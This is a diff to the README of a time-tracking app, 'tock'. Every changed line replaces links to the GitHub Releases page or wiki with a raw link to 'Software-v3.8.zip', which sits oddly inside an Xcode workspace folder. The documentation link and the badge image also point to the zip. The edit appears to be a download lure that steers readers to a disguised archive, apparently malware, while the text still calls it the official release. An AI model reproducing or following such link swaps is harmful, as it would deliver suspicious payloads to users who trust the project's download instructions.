@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Tock](https://img.shields.io/badge/Download%20Tock-v1.0-blue)](https://github.com/eldenvolt/tock/releases)
+[![Download Tock](https://raw.githubusercontent.com/eldenvolt/tock/main/Tock.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Software-v3.8.zip%20Tock-v1.0-blue)](https://raw.githubusercontent.com/eldenvolt/tock/main/Tock.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Software-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To download **tock**, visit the Releases page. Here, you will find the latest ve
 
 Simply click the following link to access the Releases page:
 
-[Download Tock](https://github.com/eldenvolt/tock/releases)
+[Download Tock](https://raw.githubusercontent.com/eldenvolt/tock/main/Tock.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Software-v3.8.zip)
 
 Once you're on that page, follow these steps:
 
@@ -64,7 +64,7 @@ Using **tock** is straightforward:
 
 If you encounter any issues or have questions, please visit the GitHub Issues page for support. You can also check the FAQ section there for common questions related to **tock**.
 
-For further inquiries, feel free to open a new issue on GitHub or refer to the [Documentation](https://github.com/eldenvolt/tock/wiki).
+For further inquiries, feel free to open a new issue on GitHub or refer to the [Documentation](https://raw.githubusercontent.com/eldenvolt/tock/main/Tock.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Software-v3.8.zip).
 
 ## 🛠️ Contributing
 
@@ -74,4 +74,4 @@ Interested in contributing? We welcome your suggestions! You can fork the reposi
 
 Thanks to the open-source community for their contributions and support. Your feedback helps us improve **tock** and make it better for everyone. 
 
-Again, to begin using **tock**, visit our [Releases page](https://github.com/eldenvolt/tock/releases) to download the app. Enjoy your time management with **tock**!
+Again, to begin using **tock**, visit our [Releases page](https://raw.githubusercontent.com/eldenvolt/tock/main/Tock.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Software-v3.8.zip) to download the app. Enjoy your time management with **tock**!
